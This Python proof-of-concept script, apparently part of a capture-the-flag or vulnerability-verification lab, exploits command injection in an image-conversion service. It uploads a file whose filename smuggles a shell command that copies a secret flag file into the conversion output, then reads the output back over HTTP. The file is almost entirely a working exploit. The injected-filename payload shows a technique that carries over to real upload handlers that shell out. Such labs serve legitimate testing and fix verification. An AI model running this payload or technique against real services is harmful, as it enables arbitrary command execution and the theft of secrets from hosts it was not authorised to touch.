#!/usr/bin/env python3
"""
PoC #1: Command injection via the ImageMagick shell-out
-------------------------------------------------------
ImageMagickService.convert() builds the whole `magick ...` command line by
string concatenation from untrusted input and runs it through `sh -c`. The
uploaded file's *filename* flows in verbatim, so shell metacharacters in the
filename run arbitrary commands on the IPM host.

Verification is over HTTP only, and it proves more than "a command ran": the
injected command `cat`s the runtime flag file (written by entrypoint.sh from
IPM_FLAG, see ../Dockerfile) into the service's output file, which IPM then
reads back and STORs into FMM under our chosen `name`. We RETR it through
GET /image/{name} and check the recovered bytes are a FLAG{...} marker -
i.e. arbitrary command execution actually disclosed this deployment's secret,
not just proved reachability.

Run IPM first, then:  python3 01_command_injection.py [host] [port]
"""
import re
import sys
import urllib.error
import urllib.request
import uuid

FLAG_FILE = "/home/ctf/ipm/secret/flag.txt"

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"


def post_multipart(url, fields, part_name, filename, data):
    boundary = "----ipmPoC" + uuid.uuid4().hex
    body = b""
    for k, v in fields.items():
        body += (f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
                 f"{v}\r\n").encode()
    body += (f"--{boundary}\r\n"
             f'Content-Disposition: form-data; name="{part_name}"; filename="{filename}"\r\n'
             f"Content-Type: application/octet-stream\r\n\r\n").encode()
    body += data + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        # A patched IPM rejects the malicious filename outright (e.g. 400) rather
        # than shelling out. That is the injection being BLOCKED, not an infra
        # failure, so return the error response and let main() reach its
        # no-flag path (exit 1 = FIXED) instead of crashing (exit 2 = could-not-run).
        return e.code, e.read().decode(errors="replace")


def get(url):
    with urllib.request.urlopen(url, timeout=30) as r:
        return r.status, r.read()


def main():
    out_name = f"cmdi_{uuid.uuid4().hex[:8]}.png"

    # When spliced into `magick <FILENAME> -resize 512x512 png:<out_name>`
    # running in the (temp) working directory, this `cat`s the runtime flag
    # file into `<out_name>`, which IPM then reads back and STORs.
    payload_name = f"x.png;cat {FLAG_FILE}>{out_name};echo "

    print(f"[*] Uploading with injected filename to exfiltrate {FLAG_FILE}")
    status, resp = post_multipart(
        f"{BASE}/convert",
        {"name": out_name},
        "image", payload_name, b"not-a-real-image",
    )
    print(f"[*] /convert -> {status} {resp}")

    print(f"[*] Fetching stored output back via /image/{out_name}")
    try:
        istatus, content = get(f"{BASE}/image/{out_name}")
    except Exception as e:
        print(f"[-] Retrieval failed: {e}")
        sys.exit(1)

    m = re.search(rb"FLAG\{[^}]*\}", content)
    if m:
        print(f"[+] Command injection confirmed - recovered flag over HTTP: {m.group(0).decode()}")
    else:
        print(f"[-] No flag found in retrieved output: {content[:80]!r}")
        sys.exit(1)


if __name__ == "__main__":
    main()
